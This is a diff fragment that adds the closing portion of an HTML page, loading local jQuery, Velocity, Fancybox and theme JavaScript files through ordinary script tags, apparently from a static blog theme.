+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
